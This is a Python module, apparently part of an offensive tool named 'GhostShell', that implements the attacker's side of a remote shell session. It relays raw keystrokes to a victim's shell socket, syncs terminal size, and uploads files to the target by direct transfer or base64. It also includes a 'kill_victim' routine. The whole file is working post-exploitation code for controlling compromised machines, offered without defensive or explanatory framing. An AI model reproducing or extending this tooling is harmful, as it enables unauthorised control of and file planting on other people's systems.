import sys
import select
import termios
import tty
import os
import threading
import time
import signal

from core.terminal  import get_terminal_size
from core.network   import make_server
from transfer.filetransfer  import file_transfer_flow
from transfer.base64transfer import base64_flow


def kill_victim(shell_sock):
    try:
        shell_sock.sendall(b'exit\n')
        time.sleep(0.3)
    except:
        pass


def sock_drain(shell_sock, timeout=0.8):
    shell_sock.setblocking(False)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            data = shell_sock.recv(4096)
            if not data:
                break
        except:
            break
        time.sleep(0.02)
    shell_sock.setblocking(True)


def send_file_flow(shell_sock, file_port, fd):
    from ui.menu import arrow_menu
    method = arrow_menu(fd, "Transfer method:", ["Send file", "Base64"])
    if method == 0:
        file_transfer_flow(shell_sock, file_port, fd)
    elif method == 1:
        base64_flow(shell_sock, fd)


def interactive(shell_sock, attacker_ip, file_port):
    fd           = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    input_buf    = b""

    printer_stop  = threading.Event()
    printer_pause = threading.Event()
    printer_pause.clear()

    def shell_printer():
        while not printer_stop.is_set():
            if printer_pause.is_set():
                time.sleep(0.02)
                continue
            r, _, _ = select.select([shell_sock], [], [], 0.05)
            if r:
                try:
                    data = shell_sock.recv(4096)
                    if not data:
                        printer_stop.set()
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except:
                    printer_stop.set()
                    break

    printer = threading.Thread(target=shell_printer, daemon=True)
    printer.start()

    def on_resize(signum, frame):
        r, c = get_terminal_size()
        try:
            shell_sock.sendall(f"stty rows {r} cols {c}\n".encode())
        except:
            pass

    signal.signal(signal.SIGWINCH, on_resize)

    try:
        tty.setraw(fd)

        while True:
            r, _, _ = select.select([sys.stdin], [], [], 0.1)
            if not r:
                continue

            char = os.read(fd, 1)
            if not char:
                raise Exception("stdin closed")

            if char == b'\x04':
                raise Exception("Attacker pressed Ctrl+D")

            if char in (b'\r', b'\n'):
                cmd = input_buf.decode(errors='ignore').strip()
                input_buf = b""

                if cmd == "send":
                    printer_pause.set()
                    time.sleep(0.15)
                    try:
                        shell_sock.sendall(b'\x03')
                        time.sleep(0.3)
                        sock_drain(shell_sock, timeout=0.8)
                        sys.stdout.write("\r\n")
                        sys.stdout.flush()
                        send_file_flow(shell_sock, file_port, fd)
                    finally:
                        sock_drain(shell_sock, timeout=0.3)
                        input_buf = b""
                        tty.setraw(fd)
                        printer_pause.clear()

                elif cmd == "exit":
                    raise Exception("Attacker typed exit")

                else:
                    shell_sock.sendall(char)

            elif char in (b'\x7f', b'\x08'):
                if input_buf:
                    input_buf = input_buf[:-1]
                shell_sock.sendall(char)

            elif char < b'\x20':
                input_buf = b""
                shell_sock.sendall(char)

            else:
                input_buf += char
                if len(input_buf) > 200:
                    input_buf = input_buf[-200:]
                shell_sock.sendall(char)

    except KeyboardInterrupt:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        sys.stdout.write("\n\033[1;33m[!]\033[0m Ctrl+C — closing session.\n")
        sys.stdout.flush()
        kill_victim(shell_sock)

    except Exception as e:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        msg = str(e)
        if "Attacker typed exit" in msg:
            sys.stdout.write("\n\033[1;33m[!]\033[0m Exit — closing session.\n")
        elif "Ctrl+D" in msg:
            sys.stdout.write("\n\033[1;33m[!]\033[0m Ctrl+D — closing session.\n")
        else:
            sys.stdout.write(f"\n\033[1;31m[!]\033[0m Disconnected: {msg}\n")
        sys.stdout.flush()
        kill_victim(shell_sock)

    finally:
        printer_stop.set()
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        try:
            shell_sock.close()
        except:
            pass
        print("\n\033[1;36m[*]\033[0m GhostShell session ended.")
